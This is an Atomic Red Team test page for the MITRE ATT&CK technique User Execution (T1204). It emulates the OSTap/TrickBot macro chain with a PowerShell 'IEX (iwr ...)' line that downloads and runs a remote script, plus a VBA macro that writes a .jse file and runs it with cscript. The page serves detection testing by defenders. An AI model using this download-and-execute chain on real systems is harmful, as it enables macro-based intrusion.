# T1204 - User Execution
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1204)
<blockquote>An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [Spearphishing Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl. 

As an example, an adversary may weaponize Windows Shortcut Files (.lnk) to bait a user into clicking to execute the malicious payload.(Citation: Proofpoint TA505 June 2018) A malicious .lnk file may contain [PowerShell](https://attack.mitre.org/techniques/T1086) commands. Payloads may be included into the .lnk file itself, or be downloaded from a remote server.(Citation: FireEye APT29 Nov 2018)(Citation: PWC Cloud Hopper Technical Annex April 2017) 

While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.</blockquote>

## Atomic Tests

- [Atomic Test #1 - OSTap Style Macro Execution](#atomic-test-1---ostap-style-macro-execution)


<br/>

## Atomic Test #1 - OSTap Style Macro Execution
This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. The .jse file in turn launches wscript.exe.
Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.

This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns

**Supported Platforms:** Windows


#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| ms_office_version | Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office" default: 16.0
 | String | 16.0|
| ms_product | "Word" or "Excel" default: Word
 | String | Word|
| jse_path | Path for the macro to write out the "malicious" .jse file
 | String | C:\Users\Public\art.jse|


#### Attack Commands: Run with `powershell`! 
```
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
```

#### Cleanup Commands:
```
if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }
try { Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' } catch {}
```


#### Dependencies:  Run with `powershell`!
##### Description: Test Requires MS Word to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
##### Check Prereq Commands:
```
If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 } 
```
##### Get Prereq Commands:
```
$msword = New-Object -ComObject word.application
Stop-Process -Name WINWORD
```
